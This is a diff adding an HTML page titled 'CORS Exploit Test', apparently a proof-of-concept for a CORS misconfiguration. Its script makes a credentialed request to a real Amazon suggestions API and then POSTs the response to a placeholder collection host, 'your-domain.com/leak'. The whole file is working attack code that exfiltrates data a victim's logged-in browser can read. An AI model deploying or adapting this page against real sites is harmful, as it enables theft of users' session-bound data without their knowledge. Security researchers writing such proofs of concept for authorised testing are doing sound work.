@@ -1,0 +1,24 @@
+<html>
+<head>
+    <title>CORS Exploit Test</title>
+</head>
+<body>
+    <h1>Testing CORS Misconfiguration</h1>
+    <script>
+        fetch("https://completion.amazon.com/api/2017/suggestions?q=iphone", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Leaked Data:", data);
+            fetch("https://your-domain.com/leak", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ leakedData: data })
+            });
+        })
+        .catch(err => console.error("Error:", err));
+    </script>
+</body>
+</html>
